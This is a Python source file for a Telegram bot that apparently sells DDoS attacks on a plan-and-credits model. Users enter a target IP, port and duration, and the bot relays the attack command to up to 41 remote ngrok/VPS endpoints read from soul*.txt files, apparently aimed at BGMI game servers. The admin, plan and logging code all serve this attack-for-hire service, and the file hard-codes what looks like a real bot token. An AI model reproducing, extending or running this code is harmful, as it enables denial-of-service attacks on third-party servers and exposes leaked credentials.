import telebot
from telebot import types
import re
import time
import logging
import threading
import asyncio
import requests
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO)

# Bot configuration
API_TOKEN = '8006244049:AAEaXzkPV9X6bnBuyNdYibhsfTeIgIiplks'  # Replace with your bot token
OWNER_ID = 5730843286             # Replace with your Telegram user ID

bot = telebot.TeleBot(API_TOKEN)

# ---------------------------
# Patch bot.send_message to prepend a symbol to every reply.
# You can change the symbol below as desired.
original_send_message = bot.send_message
def send_message_with_symbol(chat_id, text, **kwargs):
    symbol = "➤ "  # Symbol to prepend
    text = symbol + text
    return original_send_message(chat_id, text, **kwargs)
bot.send_message = send_message_with_symbol

# ---------------------------
# Global data structures
approved_users = set()   # Users approved to use the bot (by having an assigned plan)
blocked_users = set()    # Blocked users
admin_info = {}          # Admin info: {admin_id: credits}
user_plans = {}          # User plans: {user_id: {"plan": PLAN_NAME, "expiry": timestamp}}
attack_logs = []         # List of attack logs
start_time = time.time() # Bot uptime reference

# Plan settings
plan_expiry = {
    "Basic": 1 * 24 * 3600,      # 1 day
    "Standard": 3 * 24 * 3600,   # 3 days
    "Pro": 7 * 24 * 3600,        # 1 week
    "VIP": 30 * 24 * 3600        # 1 month (approx)
}
plan_cost = {
    "Basic": 2,
    "Standard": 5,
    "Pro": 10,
    "VIP": 20
}

# Attack duration mapping (used for buttons)
# "1" => 2 minutes, "2" => 3 minutes, etc.
# (We store the value in seconds.)
attack_duration_mapping = {
    "1": 2 * 60,  # 120 seconds
    "2": 3 * 60,  # 180 seconds
    "3": 4 * 60,  # 240 seconds
    "4": 5 * 60,  # 300 seconds
    "5": 5 * 60   # 300 seconds (max; can be adjusted)
}

# Allowed duration buttons per plan.
allowed_durations = {
    "Basic": ["1", "2", "3"],
    "Standard": ["1", "2", "3", "4"],
    "Pro": ["1", "2", "3", "4", "5"],
    "VIP": ["1", "2", "3", "4", "5"]
}

# Dictionary to temporarily store pending attack selections and state.
# For each chat_id, we store a dict with:
#   state: "waiting_duration" or "waiting_target"
#   (if waiting_duration) allowed_mapping: { button_text: seconds, ... }
#   (if waiting_target) duration_seconds: chosen duration (in seconds)
pending_attacks = {}

##############################
# ASYNC ATTACK FUNCTION
##############################
# This function iterates over a list of files (each containing a VPS/ngrok URL)
# and sends a GET request to each URL with the target parameters.
async def run_attack_command_async(target_ip, target_port, duration):
    files = [
        "soul.txt", "soul1.txt", "soul2.txt", "soul3.txt", "soul4.txt",
        "soul5.txt", "soul6.txt", "soul7.txt", "soul8.txt", "soul9.txt", "soul10.txt",
        "soul11.txt", "soul12.txt", "soul13.txt", "soul14.txt", "soul15.txt",
        "soul16.txt", "soul17.txt", "soul18.txt", "soul19.txt", "soul20.txt",
        "soul21.txt", "soul22.txt", "soul23.txt", "soul24.txt", "soul25.txt",
        "soul26.txt", "soul27.txt", "soul28.txt", "soul29.txt", "soul30.txt",
        "soul31.txt", "soul32.txt", "soul33.txt", "soul34.txt", "soul35.txt",
        "soul36.txt", "soul37.txt", "soul38.txt", "soul39.txt", "soul40.txt"
    ]
    for current_file in files:
        try:
            with open(current_file, "r") as file:
                ngrok_url = file.read().strip()
            url = f"{ngrok_url}/bgmi?ip={target_ip}&port={target_port}&time={duration}"
            headers = {"ngrok-skip-browser-warning": "any_value"}
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                logging.info(f"Attack command sent successfully: {url}")
                try:
                    logging.info(f"Response: {response.json()}")
                except Exception:
                    logging.info(f"Response: {response.text}")
            else:
                logging.error(f"Failed to send attack command. Status code: {response.status_code}")
                logging.error(f"Response: {response.text}")
        except Exception as e:
            logging.error(f"Failed to execute command with {current_file}: {e}")

##############################
# ERROR HANDLING DECORATOR
##############################
def safe_handler(func):
    """
    Decorator to catch exceptions in command handlers.
    If an error occurs, a friendly error message is sent and the error is logged.
    """
    def wrapper(message, *args, **kwargs):
        try:
            return func(message, *args, **kwargs)
        except Exception as e:
            bot.send_message(message.chat.id, "❌ An unexpected error occurred. Please try again later.")
            logging.exception(f"Error in {func.__name__}: {e}")
    return wrapper

##############################
# USER COMMANDS
##############################
@bot.message_handler(commands=['start'])
@safe_handler
def start_command(message):
    if message.chat.id in blocked_users:
        bot.send_message(message.chat.id, "❌ You are blocked from using this bot.")
        return
    if message.chat.id not in user_plans:
        bot.send_message(message.chat.id, "❌ You do not have an assigned plan. Please contact an admin.")
        return
    plan = user_plans[message.chat.id]['plan']
    bot.send_message(
        message.chat.id,
        f"👋 Welcome! Your assigned plan is {plan}.\n\n"
        "To launch an attack, use the /attack command.\n"
        "Example usage:\n"
        "1. Send /attack\n"
        "2. Tap one of the duration buttons (e.g., 120 sec, 180 sec, etc.)\n"
        "3. Then send the target as: <IP> <PORT> (e.g., 192.168.1.1 8080)",
        parse_mode="Markdown"
    )

@bot.message_handler(commands=['my_plan'])
@safe_handler
def my_plan(message):
    if message.chat.id in user_plans:
        plan = user_plans[message.chat.id]['plan']
        expiry = user_plans[message.chat.id]['expiry']
        expiry_str = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S")
        bot.send_message(message.chat.id, f"✅ Your plan is <b>{plan}</b> and it expires on <b>{expiry_str}</b>.", parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "❌ You do not have an assigned plan.")

##############################
# HELP COMMAND (role-based)
##############################
@bot.message_handler(commands=['help'])
@safe_handler
def help_command(message):
    if message.chat.id == OWNER_ID:
        help_text = (
            "<b>Owner Commands:</b>\n"
            "/make_admin USER_ID - Promote a user to admin\n"
            "/remove_admin USER_ID - Remove admin access\n"
            "/add_credits ADMIN_ID AMOUNT - Add credits to an admin\n"
            "/remove_credits ADMIN_ID AMOUNT - Remove credits from an admin\n"
            "/list_admins - List all admins with credits\n\n"
            "<b>Admin Commands:</b>\n"
            "/set_plan USER_ID PLAN_NAME - Assign a plan to a user\n"
            "/remove_plan USER_ID - Remove a user's plan\n"
            "/list_users - List users with their assigned plans\n"
            "/my_credits - Check your admin credits\n"
            "/help_admin - Show detailed admin commands\n\n"
            "<b>User Commands:</b>\n"
            "/start - Start the bot and view your plan commands\n"
            "/my_plan - Check your assigned plan\n"
            "/attack - Launch an attack using reply buttons\n"
            "/allplan - View all available plans and credit costs\n"
            "/status - Show bot uptime and usage stats\n"
            "/statistics - Show total attacks launched\n"
            "/cancel_attack - Cancel a pending attack\n"
            "/update_plan - Request a plan update\n"
            "/feedback - Send feedback to the owner"
        )
    elif message.chat.id in admin_info:
        help_text = (
            "<b>Admin Commands:</b>\n"
            "/set_plan USER_ID PLAN_NAME - Assign a plan to a user\n"
            "/remove_plan USER_ID - Remove a user's plan\n"
            "/list_users - List users with their assigned plans\n"
            "/my_credits - Check your admin credits\n"
            "/add_credits ADMIN_ID AMOUNT - Add credits to an admin\n"
            "/remove_credits ADMIN_ID AMOUNT - Remove credits from an admin\n"
            "/list_admins - List all admins with credits\n"
            "/help_admin - Show detailed admin commands\n\n"
            "<b>User Commands:</b>\n"
            "/start - Start the bot and view your plan commands\n"
            "/my_plan - Check your assigned plan\n"
            "/attack - Launch an attack using reply buttons\n"
            "/allplan - View all available plans and credit costs\n"
            "/status - Show bot uptime and usage stats\n"
            "/statistics - Show total attacks launched\n"
            "/cancel_attack - Cancel a pending attack\n"
            "/update_plan - Request a plan update\n"
            "/feedback - Send feedback to the owner"
        )
    else:
        help_text = (
            "<b>User Commands:</b>\n"
            "/start - Start the bot and view your plan commands\n"
            "/my_plan - Check your assigned plan\n"
            "/attack - Launch an attack using reply buttons\n"
            "/allplan - View all available plans and credit costs\n"
            "/status - Show bot uptime and usage stats\n"
            "/statistics - Show total attacks launched\n"
            "/cancel_attack - Cancel a pending attack\n"
            "/update_plan - Request a plan update\n"
            "/feedback - Send feedback to the owner"
        )
    bot.send_message(message.chat.id, help_text, parse_mode="HTML")

##############################
# ALL PLAN COMMAND
##############################
@bot.message_handler(commands=['allplan'])
@safe_handler
def all_plan(message):
    msg = "<b>📋 Available Plans:</b>\n\n"
    for plan in plan_expiry:
        duration_days = plan_expiry[plan] // (24 * 3600)
        cost = plan_cost[plan]
        day_text = "day" if duration_days == 1 else "days"
        msg += f"• <b>{plan}</b>: Duration: {duration_days} {day_text}, Cost: {cost} credits\n"
    bot.send_message(message.chat.id, msg, parse_mode="HTML")

##############################
# STATUS COMMAND
##############################
@bot.message_handler(commands=['status'])
@safe_handler
def status(message):
    uptime_seconds = int(time.time() - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}h {minutes}m {seconds}s"
    total_users = len(user_plans)
    total_attacks = len(attack_logs)
    msg = (
        f"🤖 Bot Uptime: {uptime_str}\n"
        f"👥 Users with access: {total_users}\n"
        f"🚀 Total attacks launched: {total_attacks}"
    )
    bot.send_message(message.chat.id, msg)

##############################
# STATISTICS COMMAND
##############################
@bot.message_handler(commands=['statistics'])
@safe_handler
def statistics(message):
    total_attacks = len(attack_logs)
    msg = f"🚀 Total attacks launched: {total_attacks}\n"
    if total_attacks > 0:
        msg += "\n".join(attack_logs[-5:])  # Show the last 5 logs
    else:
        msg += "No attacks have been launched yet."
    bot.send_message(message.chat.id, msg)

##############################
# CANCEL ATTACK COMMAND
##############################
@bot.message_handler(commands=['cancel_attack'])
@safe_handler
def cancel_attack(message):
    chat_id = message.chat.id
    if chat_id in pending_attacks:
        del pending_attacks[chat_id]
        bot.send_message(chat_id, "✅ Your pending attack has been canceled.", reply_markup=types.ReplyKeyboardRemove())
    else:
        bot.send_message(chat_id, "❌ You do not have any pending attack to cancel.")

##############################
# UPDATE PLAN COMMAND
##############################
@bot.message_handler(commands=['update_plan'])
@safe_handler
def update_plan(message):
    bot.send_message(message.chat.id, "ℹ️ To update your plan, please contact an admin.")

##############################
# FEEDBACK COMMAND
##############################
@bot.message_handler(commands=['feedback'])
@safe_handler
def feedback(message):
    bot.send_message(message.chat.id, "✉️ Please send your feedback as a reply to this message.")

##############################
# HELP_ADMIN COMMAND
##############################
@bot.message_handler(commands=['help_admin'])
@safe_handler
def help_admin(message):
    if message.chat.id in admin_info or message.chat.id == OWNER_ID:
        help_text = (
            "<b>Admin Commands:</b>\n"
            "/set_plan USER_ID PLAN_NAME - Assign a plan to a user\n"
            "/remove_plan USER_ID - Remove a user's plan\n"
            "/list_users - List users with their assigned plans\n"
            "/my_credits - Check your admin credits\n"
            "/add_credits ADMIN_ID AMOUNT - Add credits to an admin\n"
            "/remove_credits ADMIN_ID AMOUNT - Remove credits from an admin\n"
            "/list_admins - List all admins with credits\n"
            "Also, view /statistics for attack logs."
        )
        bot.send_message(message.chat.id, help_text, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "❌ You are not an admin.")

##############################
# OWNER COMMANDS
##############################
@bot.message_handler(commands=['make_admin'])
@safe_handler
def make_admin(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can make admins.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        admin_info[user_id] = admin_info.get(user_id, 0)
        bot.send_message(OWNER_ID, f"✅ User {user_id} is now an admin with {admin_info[user_id]} credits.")
        bot.send_message(user_id, "✅ You have been promoted to admin by the owner.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /make_admin USER_ID")

@bot.message_handler(commands=['remove_admin'])
@safe_handler
def remove_admin(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can remove admins.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        if user_id in admin_info:
            del admin_info[user_id]
            bot.send_message(OWNER_ID, f"✅ Admin {user_id} has been removed.")
            bot.send_message(user_id, "❌ Your admin privileges have been removed by the owner.")
        else:
            bot.send_message(OWNER_ID, "❌ That user is not an admin.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /remove_admin USER_ID")

@bot.message_handler(commands=['add_credits'])
@safe_handler
def add_credits(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can add credits.")
        return
    try:
        parts = message.text.split()
        admin_id = int(parts[1])
        amount = int(parts[2])
        admin_info[admin_id] = admin_info.get(admin_id, 0) + amount
        bot.send_message(OWNER_ID, f"✅ Added {amount} credits to admin {admin_id}. Now they have {admin_info[admin_id]} credits.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /add_credits ADMIN_ID AMOUNT")

@bot.message_handler(commands=['remove_credits'])
@safe_handler
def remove_credits(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can remove credits.")
        return
    try:
        parts = message.text.split()
        admin_id = int(parts[1])
        amount = int(parts[2])
        if admin_id in admin_info:
            admin_info[admin_id] = max(0, admin_info[admin_id] - amount)
            bot.send_message(OWNER_ID, f"✅ Removed {amount} credits from admin {admin_id}. Now they have {admin_info[admin_id]} credits.")
        else:
            bot.send_message(OWNER_ID, "❌ That user is not an admin.")
    except Exception:
        bot.send_message(OWNER_ID, "❌ Invalid format. Use: /remove_credits ADMIN_ID AMOUNT")

@bot.message_handler(commands=['list_admins'])
@safe_handler
def list_admins(message):
    if message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only the owner can list admins.")
        return
    if admin_info:
        msg = "<b>📋 Admins and their Credits:</b>\n"
        for aid, credits in admin_info.items():
            msg += f"User {aid}: {credits} credits\n"
        bot.send_message(OWNER_ID, msg, parse_mode="HTML")
    else:
        bot.send_message(OWNER_ID, "📜 No admins available.")

##############################
# ADMIN COMMANDS (Plan Management)
##############################
@bot.message_handler(commands=['set_plan'])
@safe_handler
def set_plan(message):
    # Format: /set_plan USER_ID PLAN_NAME
    if message.chat.id not in admin_info and message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only admins can assign plans.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        plan_name = parts[2].capitalize()
        if plan_name not in plan_expiry:
            bot.send_message(message.chat.id, "❌ Invalid plan name. Options: Basic, Standard, Pro, VIP.")
            return
        cost = plan_cost[plan_name]
        if message.chat.id != OWNER_ID:
            if admin_info.get(message.chat.id, 0) < cost:
                bot.send_message(message.chat.id, "❌ Not enough credits to assign this plan.")
                return
            else:
                admin_info[message.chat.id] -= cost
        expiry = time.time() + plan_expiry[plan_name]
        user_plans[user_id] = {"plan": plan_name, "expiry": expiry}
        approved_users.add(user_id)
        expiry_str = datetime.fromtimestamp(expiry).strftime("%Y-%m-%d %H:%M:%S")
        bot.send_message(message.chat.id, f"✅ Assigned {plan_name} plan to user {user_id}. Expires on {expiry_str}.")
        bot.send_message(user_id, f"✅ You have been assigned the <b>{plan_name}</b> plan. It expires on <b>{expiry_str}</b>.", parse_mode="HTML")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}\nUsage: /set_plan USER_ID PLAN_NAME")

@bot.message_handler(commands=['remove_plan'])
@safe_handler
def remove_plan(message):
    if message.chat.id not in admin_info and message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only admins can remove plans.")
        return
    try:
        parts = message.text.split()
        user_id = int(parts[1])
        if user_id in user_plans:
            del user_plans[user_id]
            approved_users.discard(user_id)
            bot.send_message(message.chat.id, f"✅ Removed plan for user {user_id}.")
            bot.send_message(user_id, "❌ Your plan has been removed by an admin.")
        else:
            bot.send_message(message.chat.id, "❌ User does not have an assigned plan.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}\nUsage: /remove_plan USER_ID")

@bot.message_handler(commands=['list_users'])
@safe_handler
def list_users(message):
    if message.chat.id not in admin_info and message.chat.id != OWNER_ID:
        bot.send_message(message.chat.id, "❌ Only admins can list users.")
        return
    if user_plans:
        msg = "<b>📋 Users with Plans:</b>\n"
        for uid, info in user_plans.items():
            expiry_str = datetime.fromtimestamp(info['expiry']).strftime("%Y-%m-%d %H:%M:%S")
            msg += f"User {uid}: {info['plan']} (Expires: {expiry_str})\n"
        bot.send_message(message.chat.id, msg, parse_mode="HTML")
    else:
        bot.send_message(message.chat.id, "📜 No users have an assigned plan.")

@bot.message_handler(commands=['my_credits'])
@safe_handler
def my_credits(message):
    if message.chat.id in admin_info:
        bot.send_message(message.chat.id, f"💰 You have {admin_info[message.chat.id]} credits.")
    else:
        bot.send_message(message.chat.id, "❌ You are not an admin.")

##############################
# ATTACK COMMAND (Reply Keyboard)
##############################
@bot.message_handler(commands=['attack'])
@safe_handler
def attack_command(message):
    chat_id = message.chat.id
    if chat_id in blocked_users:
        bot.send_message(chat_id, "❌ You are blocked from using this bot.")
        return
    if chat_id not in user_plans:
        bot.send_message(chat_id, "❌ You do not have an assigned plan. Please contact an admin.")
        return

    user_plan = user_plans[chat_id]['plan']  
    allowed_keys = allowed_durations.get(user_plan, [])  
    if not allowed_keys:  
        bot.send_message(chat_id, "❌ Your plan does not support any attack durations.")  
        return  

    # Build a reply keyboard with buttons (e.g., "120 sec", "180 sec", etc.)  
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)  
    allowed_mapping = {}  
    for key in allowed_keys:  
        seconds = attack_duration_mapping.get(key)  # already in seconds  
        button_text = f"{seconds} sec"  
        allowed_mapping[button_text] = seconds  
        markup.add(types.KeyboardButton(button_text))  

    # Set pending state: waiting for duration selection  
    pending_attacks[chat_id] = {"state": "waiting_duration", "allowed_mapping": allowed_mapping}  
    bot.send_message(chat_id,  
                     "🚀 Choose your attack duration by tapping one of the buttons below:",  
                     reply_markup=markup)

@bot.message_handler(func=lambda m: m.chat.id in pending_attacks)
@safe_handler
def process_pending_attack(message):
    chat_id = message.chat.id
    state_info = pending_attacks.get(chat_id)
    if not state_info:
        return

    # Stage 1: Waiting for duration selection  
    if state_info["state"] == "waiting_duration":  
        text = message.text.strip()  
        allowed_mapping = state_info.get("allowed_mapping", {})  
        if text not in allowed_mapping:  
            bot.send_message(chat_id, "❌ Invalid selection. Please choose one of the provided buttons.")  
            return  
        duration_seconds = allowed_mapping[text]  
        pending_attacks[chat_id] = {"state": "waiting_target", "duration_seconds": duration_seconds}  
        bot.send_message(chat_id,  
                         f"✅ You selected an attack duration of {duration_seconds} seconds.\n"  
                         "Now, please send the target in the format:\n<IP> <PORT>\nExample: 192.168.1.1 8080",  
                         reply_markup=types.ReplyKeyboardRemove())  
        return  

    # Stage 2: Waiting for target input  
    elif state_info["state"] == "waiting_target":  
        text = message.text.strip()  
        parts = text.split()  
        if len(parts) != 2:  
            bot.send_message(chat_id, "❌ Invalid format. Please send the target as: <IP> <PORT>\nExample: 192.168.1.1 8080")  
            return  
        ip, port = parts[0].strip(), parts[1].strip()  
        ip_pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")  
        if not ip_pattern.match(ip) or not (port.isdigit() and 1 <= int(port) <= 65535):  
            bot.send_message(chat_id, "❌ Invalid IP or port. Please use the format: 192.168.1.1 8080")  
            return  

        duration_seconds = state_info["duration_seconds"]  
        del pending_attacks[chat_id]  
          
        try:  
            asyncio.run(run_attack_command_async(ip, port, duration_seconds))  
            bot.send_message(chat_id,  
                             f"🚀 Attack initiated on {ip}:{port} for {duration_seconds} seconds.\n"  
                             "Check logs for details.")  
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  
            try:  
                user_info = bot.get_chat(chat_id)  
                username = user_info.username if user_info.username else f"User {chat_id}"  
            except Exception:  
                username = f"User {chat_id}"  
            owner_message = (  
                f"⚠️ **Attack Alert!** ⚠️\n"  
                f"👤 **User:** @{username}\n"  
                f"🎯 **Target:** `{ip}:{port}`\n"  
                f"⏳ **Duration:** `{duration_seconds} seconds`\n"  
                f"🕒 **Time:** `{timestamp}`\n\n"  
                f"📢 **Action:** Attack initiated via async command!"  
            )  
            bot.send_message(OWNER_ID, owner_message, parse_mode="Markdown")  
            attack_logs.append(f"{timestamp} - User {chat_id} attacked {ip}:{port} for {duration_seconds} seconds.")  
        except Exception as e:  
            bot.send_message(chat_id, f"❌ Error executing attack: {str(e)}")

##############################
# GENERAL FEEDBACK HANDLER
##############################
@bot.message_handler(func=lambda m: True)
@safe_handler
def general_message_handler(message):
    chat_id = message.chat.id
    if message.reply_to_message and "/feedback" in message.reply_to_message.text:
        feedback_text = message.text.strip()
        forward_text = f"Feedback from User {chat_id}:\n\n{feedback_text}"
        bot.send_message(OWNER_ID, forward_text)
        bot.send_message(chat_id, "✅ Your feedback has been sent. Thank you!")
    # Additional general messages can be handled here.

##############################
# BOT POLLING
##############################
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"Error during polling: {str(e)}")
        time.sleep(5)
